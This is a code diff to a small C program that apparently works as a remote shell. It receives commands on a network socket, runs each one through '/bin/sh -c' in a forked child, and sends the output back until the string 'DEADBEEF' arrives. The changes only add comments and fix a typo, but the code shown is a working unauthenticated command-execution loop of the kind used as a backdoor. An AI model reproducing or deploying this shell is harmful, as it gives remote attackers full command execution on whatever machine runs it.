@@ -67,31 +67,37 @@ int main(){
     pipe(fd);
    
     /* This shit will break about every other run
-     * uncommend the below 2 lines to put the pipe FD in non-blocking mode
+     * uncomment the below 2 lines to put the pipe FD in non-blocking mode
      * if you do you will need to hit enter 2 times when sending a CMD
+     * but you wont have issues with blank lines
      * send "DEADBEEF" to stop the loop
-     * this needs arg parsing, poll()/select()
+     * this needs arg parsing and poll()/select()
      */
 
     //int flags = fcntl(fd[READ_END], F_GETFL, 0);
     //fcntl(fd[READ_END], F_SETFL, flags | O_NONBLOCK);    
     while( (strcmp(CMD, "DEADBEEF\n") != 0) ){
-   	 memset(BUFFER, 0, sizeof(BUFFER));
+   	 //Clear out buffers
+	 memset(BUFFER, 0, sizeof(BUFFER));
    	 memset(CMD, 0, 4096);
-   	 
+   	 //Recv from socket
    	 recv(newSocket,CMD, sizeof(CMD), 0);
    	 pid = fork();
-   	 
+   	 //if child do exec the cmd
    	 if(pid==0)
    	 {
+   	     //Redirect child process SDTOUT and STDERR to pipe
    	     dup2(fd[WRITE_END], STDOUT_FILENO);
    	     dup2(fd[WRITE_END], STDERR_FILENO);
-
+   	     //execute CMD
    	     execl("/bin/sh", "sh", "-c", CMD, (char *) NULL);
    	 }
+   	 //Read the output of child proc
    	 read(fd[READ_END], BUFFER, sizeof(BUFFER));
+	 //Send it
 	 send(newSocket,BUFFER,strlen(BUFFER),0);
     }
+    //Cleanup FD's when done
     close(fd[0]);
     close(fd[1]);
     close(newSocket);
